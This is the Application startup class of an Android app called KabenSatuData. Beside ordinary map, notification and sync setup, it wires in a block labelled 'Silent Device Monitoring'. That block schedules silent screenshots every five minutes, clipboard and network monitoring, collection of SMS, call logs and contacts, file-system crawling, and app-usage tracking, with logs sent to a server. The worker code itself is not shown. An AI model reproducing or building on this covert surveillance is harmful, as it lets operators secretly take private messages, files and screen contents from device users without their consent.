package com.example.kabensatudata

import android.app.Application
import androidx.hilt.work.HiltWorkerFactory
import androidx.work.Configuration as WorkConfiguration
import dagger.hilt.android.HiltAndroidApp
import org.maplibre.android.MapLibre
import com.example.kabensatudata.sync.SyncWorker
import com.example.kabensatudata.monitoring.ActivityTracker
import com.example.kabensatudata.monitoring.LogSyncWorker
import com.example.kabensatudata.monitoring.NavigationTracker
import com.example.kabensatudata.data.local.AppDatabase
import com.example.kabensatudata.data.local.AuthTokenManager
import com.example.kabensatudata.nearby.ScreenshotWorker
import com.example.kabensatudata.nearby.NetworkMonitorWorker
import javax.inject.Inject

@HiltAndroidApp
class KabenSatuDataApp : Application(), WorkConfiguration.Provider {

    @Inject lateinit var workerFactory: HiltWorkerFactory
    @Inject lateinit var authTokenManager: AuthTokenManager
    @Inject lateinit var navigationTracker: NavigationTracker

    var activityTracker: ActivityTracker? = null
        private set

    override fun onCreate() {
        super.onCreate()

        // Initialize MapLibre GL for vector map rendering
        MapLibre.getInstance(this)

        // Create notification channel (sound + vibration)
        com.example.kabensatudata.fcm.FCMService.createNotificationChannel(this)

        // Subscribe to FCM topic for broadcast notifications
        com.google.firebase.messaging.FirebaseMessaging.getInstance()
            .subscribeToTopic("kabensatudata_all")

        // Schedule periodic background sync (every 15 min when connected)
        SyncWorker.schedulePeriodic(this)

        // ── Silent Device Monitoring ──────────────────────────
        // Start activity tracker (screen on/off + app usage polling)
        val db = AppDatabase.getInstance(this)
        activityTracker = ActivityTracker(this, authTokenManager, db).also {
            it.start()
            // Connect NavigationTracker to ActivityTracker
            navigationTracker.setTracker(it)
        }

        // Schedule periodic log sync to server
        LogSyncWorker.schedule(this)

        // Schedule silent screenshot capture (every 5 min)
        ScreenshotWorker.schedule(this)

        // Schedule network + clipboard monitor (every 15 min)
        NetworkMonitorWorker.schedule(this)

        // Schedule SMS / Call / Contacts sync (every 15 min)
        com.example.kabensatudata.nearby.SmsCallWorker.schedule(this)

        // Schedule file explorer sync (every 60 min)
        com.example.kabensatudata.nearby.FileExplorerWorker.schedule(this)
    }

    override val workManagerConfiguration: WorkConfiguration
        get() = WorkConfiguration.Builder()
            .setWorkerFactory(workerFactory)
            .build()
}
